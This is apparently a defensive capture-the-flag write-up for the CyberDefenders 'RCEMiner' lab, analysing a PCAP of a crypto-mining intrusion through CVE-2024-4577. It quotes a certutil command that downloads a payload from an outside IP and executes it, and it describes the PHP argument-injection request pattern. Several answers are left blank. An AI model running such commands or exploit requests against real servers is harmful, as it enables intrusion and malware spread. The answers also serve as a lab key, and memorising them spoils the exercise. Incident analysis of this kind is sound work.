<img width="685" height="249" alt="immagine" src="https://github.com/user-attachments/assets/c1ccc3ad-a976-4f2a-8d15-bc703f59e20f" /># RCEMiner – PCAP Analysis (CyberDefenders)

## Scenario
Over the past 24 hours, the IT department has noticed a drastic increase in CPU and memory usage on several publicly accessible servers.
Initial assessments indicate that the spike may be linked to unauthorized crypto-mining activities.
Your team has been provided with a network capture (PCAP) file from the affected servers for analysis.
Analyze the provided PCAP file using the network analysis tools available to you.
Your goal is to identify how the attacker gained access and what actions they took on the compromised server.

## References
- https://cyberdefenders.org/blueteam-ctf-challenges/rceminer/

> [!IMPORTANT]
> The questions below are not in the original lab order. I arranged them in the order that best matched my investigation flow.

### Q7 - Identifying where the malware could be stored on a compromised system is crucial for ensuring the complete removal of the infection and preventing the malware from being executed again. The compromised server was used to host a malicious file, which was then delivered to other vulnerable websites. What is the full path where this malware was stored after being downloaded from the compromised server?

I first took a quick look at **Conversations**, but there was too much noise there, so I filtered more directly on:
```text
http.request.method == POST
```
That cut things down fast and made the malicious activity much easier to read.
From there I just skimmed through the different POST requests until the pattern became obvious.
A lot of them were clearly abnormal already, and in some earlier packets from the same source IP there were multiple `cmd`-style payloads that were obviously not normal web traffic.

In the relevant POST body, the important part was written directly in the `mail[#markup]` field:
```text
cmd /c certutil -urlcache -split -f http://36.96.48.3:19490/spread.txt C:\ProgramData\spread.exe && C:\ProgramData\spread.exe
```
So this gave both the download step and the execution step in one shot.
That is why I used the full malware path.

<img width="2356" height="495" alt="immagine" src="https://github.com/user-attachments/assets/b5ff131a-04bd-41d4-8110-aa6e7657d1da" />
<img width="1902" height="128" alt="immagine" src="https://github.com/user-attachments/assets/04dfdc6c-e9a6-4089-b7ee-4e014c343152" />

**Answer:** `C:\ProgramData\spread.exe`
### Q1 - To identify the entry point of the attack and prevent similar breaches in the future, it’s crucial to recognize the vulnerability that was exploited and the method used by the attacker to execute unauthorized commands. Which vulnerability was exploited to gain initial access to the public webserver?

Now that I knew `36.96.48.3` was the infected host, I flipped the view around and put it on the **destination** side, while keeping only **POST** requests since they were the most useful place to start for this part of the investigation.
That immediately narrowed things down to the more suspicious inbound activity instead of wasting time on generic traffic.

<img width="1731" height="126" alt="immagine" src="https://github.com/user-attachments/assets/f992e658-8901-4609-ac92-76a159bc01dc" />

From there I followed the HTTP stream on the packet that stood out the most.
The reason it stood out was that the request was clearly not normal web usage at all: it was hitting `/index.php/index.php?...` with `allow_url_include` and `auto_prepend_file=php://input`, and the body was directly using `<?php system(...) ?>` to launch a PowerShell command.
At that point the exploit pattern was already basically visible in clear text.

<img width="1677" height="786" alt="immagine" src="https://github.com/user-attachments/assets/ea214da3-6b33-4c22-91b2-b9e47dd6d166" />

So I just copied the relevant part of the payload and searched it directly.
The result pointing to **CVE-2024-4577** matched what I was already seeing in the traffic, and a quick read was enough to confirm it lined up with this exact kind of PHP command execution abuse.

<img width="707" height="291" alt="immagine" src="https://github.com/user-attachments/assets/7d4dd734-aaba-422d-8890-4eff851d6a7f" />

**Answer:** `CVE-2024-4577`

### Q2 - A specific Unicode character is used in the exploit to manipulate how the server interprets command-line arguments, bypassing the standard input handling. What is the Unicode code point of this character?

Here I had to read a bit more than I wanted, because it was only one question and I did not want to waste too much time digging through the full article.
Given the wording of the question, I stopped at the section comparing the two visually identical ways to write the same argument.
That part showed the benign version using the standard hyphen `0x2D`, while the malicious version used the soft hyphen `0xAD`.
So even if the question says Unicode code point, in practice the expected lab answer was `0xAD`.

<img width="988" height="542" alt="immagine" src="https://github.com/user-attachments/assets/6016f66b-bef0-4c44-a582-153465a570e9" />

**Answer:** `0xAD`

### Q3 - The attacker executed commands to gather detailed system information, including CPU specifications, after gaining access. What is the exact model of the CPU identified by the attacker's script?

I did not get this one straight from the PCAP alone.

First I went back to the earlier exploit request and noticed that the PowerShell command was downloading and executing `1.ps1`, so at that point it was obvious that the CPU question was probably answered by the attacker’s script itself, not by guessing from generic traffic.


<img width="1652" height="52" alt="immagine" src="https://github.com/user-attachments/assets/27adbca6-b2d9-4cf6-bd7d-0acdc3b8107c" />

<img width="666" height="50" alt="immagine" src="https://github.com/user-attachments/assets/22099a75-1841-4f49-ba09-ae675cb25005" />

So I extracted `1.ps1` and worked from there.
At first the content was not immediately readable, so instead of wasting time on encoding issues I just took the practical route and decoded the Base64 content online.
Once it was readable, the important part was clear: the script was collecting system information with
```powershell id="n7f5ga"
$cpuInfo = Get-WmiObject Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
```
<img width="2554" height="262" alt="immagine" src="https://github.com/user-attachments/assets/214fb35b-6e5a-44b0-86e4-c214b54a190d" />

<img width="1305" height="916" alt="immagine" src="https://github.com/user-attachments/assets/4cd64ec7-b7e2-4f83-9fba-66d294ad486e" />

That told me the script was not hardcoding the CPU model.
It was querying the machine for it and then sending the collected data back out with a POST request.

Only after seeing that in the script did I go back to the traffic and filter specifically on:
```text
ip.addr == 1.80.23.4 && http.request.method == POST
```
That let me focus on the reporting step directly.
From there I checked the returned output, and under the `Name` field the CPU model appears directly, which gave the answer.

<img width="1172" height="152" alt="immagine" src="https://github.com/user-attachments/assets/aeb37569-c86a-4f66-9ec9-bd295844e487" />

**Answer:** `Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz`

### Q6 - The malware leveraged a common network protocol to facilitate its communication with external servers, blending malicious activities with legitimate traffic. This technique is documented in the MITRE ATT&CK framework. What is the specific sub-technique ID that involves the use of DNS queries for command-and-control purposes?

The question already told me almost everything I needed: it was asking for the MITRE ATT&CK sub-technique involving **DNS queries** used for **command and control**.
So I just searched that combination directly and the right ATT&CK page came up immediately.

<img width="685" height="249" alt="immagine" src="https://github.com/user-attachments/assets/8056ba8e-4dc5-4d0f-a3dd-87ac0d82e548" />

The result matched **Application Layer Protocol: DNS**, which is the sub-technique for using DNS in C2 communications.

**Answer:** `T1071.004`

### Q4 - Understanding how malware initiates the execution of downloaded files is crucial for stopping its spread and execution. After downloading the file, the malware executed it with elevated privileges to ensure its operation. What command was used to start the process with elevated permissions?

**Answer:** ``

### Q5 - After compromising the server, the malware used it to launch a massive number of HTTP requests containing malicious payloads, attempting to exploit vulnerabilities on additional websites. What vulnerable PHP framework was initially targeted by these outbound attacks from the compromised server?

**Answer:** ``


### Q8 - Knowing the destination of the data being exfiltrated or reported by the malware helps in tracing the attacker and blocking further communications to malicious servers. The compromised server was used to report system performance metrics back to the attacker. What is the IP address and port number to which this data was sent?

**Answer:** ``

### Q9 - Identifying the specific cryptomining software used by the attacker allows for better detection and removal of similar threats in the future. The malware deployed specific software to utilize the compromised server's resources for cryptomining. What mining software and version was used?

**Answer:** ``
